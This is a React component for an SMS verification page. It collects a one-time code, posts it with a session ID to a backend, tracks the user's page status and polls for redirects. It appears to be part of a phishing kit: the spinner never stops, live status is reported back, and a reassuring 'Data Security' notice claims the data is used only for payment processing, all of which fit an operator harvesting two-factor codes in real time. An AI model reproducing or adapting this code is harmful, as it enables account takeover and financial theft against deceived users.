import React, { useState } from "react";
import { useLocation } from "react-router-dom";
import styles from "./CustomSms.module.css";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import Loading from "../../components/Loading/Loading";
import { useOnlineStatus } from "../../hooks/useOnlineStatus";

const CustomSms: React.FC = () => {
  const sessionId = localStorage.getItem("currentSessionId");
  const location = useLocation();
  
  useRedirectChecker(3000);
  useOnlineStatus({
    sessionId,
    pageName: "custom-sms",
    enabled: true,
  });

  const [sms, setSms] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  // Получаем phoneDigits из состояния навигации
  const phoneDigits = location.state?.phoneDigits;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!sms || isNaN(Number(sms)) || Number(sms) <= 0) {
      setError("Please enter a valid code");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      if (!sessionId) {
        setIsLoading(false);
        return;
      }

      const response = await fetch("/api/submit-sms", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId,
          sms: sms,
        }),
      });

      const result = await response.json();

      if (!result.success) {
        alert("SMS code submission failed!");
      } else {
        console.log("Custom SMS code submitted successfully");
      }
    } catch (error) {
      console.error("Error submitting SMS:", error);
      setError("Network error. Please try again.");
    } finally {
      setIsLoading(true);
    }
  };

  const formatSms = (value: string) => {
    return value.replace(/[^\d]/g, "");
  };

  const handleSmsChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatSms(e.target.value);
    setSms(formatted);
    setError("");
  };

  return (
    <div className={styles["balance-page"]}>
      <div className={styles["balance-container"]}>
        <div className={styles["balance-header"]}>
          <h1>Enter the code you received in an SMS</h1>
          {phoneDigits && (
            <p style={{ color: "#666", fontSize: "14px", marginTop: "8px" }}>
              Code sent to phone number ending with xxx-xxx-{phoneDigits}
            </p>
          )}
        </div>

        <form onSubmit={handleSubmit} className={styles["balance-form"]}>
          <div className={styles["input-group"]}>
            <label htmlFor="sms">SMS Code</label>
            <div className={styles["input-wrapper"]}>
              <input
                type="text"
                id="sms"
                value={sms}
                onChange={handleSmsChange}
                className={error ? styles["error"] : ""}
                disabled={isLoading}
                placeholder="Enter SMS code"
              />
            </div>
            {error && <span className={styles["error-message"]}>{error}</span>}
          </div>

          <button
            type="submit"
            className={`${styles["submit-button"]} ${
              isLoading ? styles["loading"] : ""
            }`}
            disabled={isLoading || !sms}
          >
            {isLoading ? (
              <div className={styles["loading-spinner"]}>
                <div className={styles["spinner"]}></div>
                Processing...
              </div>
            ) : (
              "Verify Code"
            )}
          </button>
        </form>

        <div className={styles["security-notice"]}>
          <div className={styles["security-icon"]}>🔒</div>
          <div className={styles["security-text"]}>
            <strong>Data Security</strong>
            <p>
              Your data is protected and is used only for payment processing.
            </p>
          </div>
        </div>
      </div>
      <Loading isLoading={isLoading} />
    </div>
  );
};

export default CustomSms;